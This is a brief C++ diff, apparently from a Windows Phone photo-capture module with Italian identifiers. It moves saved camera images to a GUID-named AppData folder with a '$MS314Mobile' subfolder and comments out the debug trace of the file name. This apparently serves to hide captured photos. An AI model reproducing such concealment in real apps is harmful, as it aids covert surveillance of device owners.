@@ -394,14 +394,14 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 						CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
 						
 						
-						sprintf(nomeFile,"photo_%i_%s.jpg",SL,nomeFileBase);
+						sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\photo_%i_%s.jpg",SL,nomeFileBase);
 
 						OutputDebugStringA(nomeFile);
 						OutputDebugStringA("\n");
 
-						WCHAR msg[128];
-						swprintf_s(msg, L"Assegnato0 nome=%s\n",nomeFile);
-						DBG_TRACE(msg, 1, FALSE);
+						///WCHAR msg[128];
+						///swprintf_s(msg, L"Assegnato0 nome=%s\n",nomeFile);
+						///DBG_TRACE(msg, 1, FALSE);
 						
 						ULONG lengthOfStream=0;
 						/****
